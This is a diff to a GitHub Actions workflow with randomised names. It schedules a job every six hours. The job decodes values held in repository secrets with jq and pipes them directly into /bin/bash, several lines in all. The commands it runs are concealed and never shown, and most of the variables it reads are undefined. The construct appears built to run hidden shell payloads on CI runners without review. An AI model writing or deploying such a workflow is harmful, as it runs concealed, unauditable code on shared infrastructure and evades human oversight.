@@ -1,9 +1,8 @@
 name: zhoubozou
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 2/6 * * *'
+    - cron: '35 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhoubozou
         env:
-          heulb9: ${{ secrets.heulb9 }}
+          clpxw943: ${{ secrets.clpxw943 }}
         run: |
-          echo $heulb9 | jq -r .wir589 | /bin/bash
-          echo $nlo08437 | jq -r .vmpcq95 | /bin/bash
-          echo $ko25384 | jq -r .i4 | /bin/bash
-          echo $t469 | jq -r .j31 | /bin/bash
-          echo $x799 | jq -r .rufnf0 | /bin/bash
-          echo $jfvh33122 | jq -r .up7052 | /bin/bash
-          echo $oj61 | jq -r .fik6337 | /bin/bash
-          echo $ekhh0 | jq -r .syyvg245 | /bin/bash
-          echo $z076 | jq -r .l72411 | /bin/bash
+          echo $clpxw943 | jq -r .so9447 | /bin/bash
+          echo $gyhgn6 | jq -r .ddhk50480 | /bin/bash
+          echo $wdal05 | jq -r .wkat35 | /bin/bash
 
